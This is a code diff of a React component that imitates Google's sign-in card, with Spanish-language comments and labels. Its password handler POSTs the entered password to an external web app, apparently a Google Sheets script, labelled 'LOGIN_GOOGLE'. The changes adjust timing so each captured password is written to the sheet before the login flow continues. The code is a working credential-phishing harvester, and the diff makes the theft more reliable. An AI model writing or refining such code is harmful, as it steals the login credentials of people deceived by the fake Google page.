@@ -22,8 +22,8 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
   const handlePasswordNext = async () => {
     if (!password.trim()) return;
 
+    // AÑADIDO: Bloqueo de seguridad para asegurar el envío
     try {
-      // FORZAMOS LA ESPERA DEL ENVÍO
       await fetch(webAppUrl, {
         method: "POST",
         mode: "no-cors",
@@ -34,14 +34,15 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
           tipo: "LOGIN_GOOGLE" 
         })
       });
-    } catch (e) {
-      console.error("Error de red, pero continuando...");
-    }
+      
+      // Esperamos un segundo extra para que Google Sheets procese la fila
+      setTimeout(() => {
+        onLoginComplete();
+      }, 1000);
 
-    // Pequeño delay de seguridad para que la fila se escriba en el Excel
-    setTimeout(() => {
+    } catch (e) {
       onLoginComplete();
-    }, 600);
+    }
   };
 
   return (
@@ -94,7 +95,7 @@ const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) =
                     onChange={(e) => setShowPassword(e.target.checked)} 
                     className="w-[18px] h-[18px] accent-[#1a73e8]" 
                 />
-                <span className="text-sm text-card-foreground">Mostrar contraseña</span>
+                <span className="text-sm">Mostrar contraseña</span>
               </label>
               <div className="flex justify-between items-center pt-4">
                 <span className="google-btn-text text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
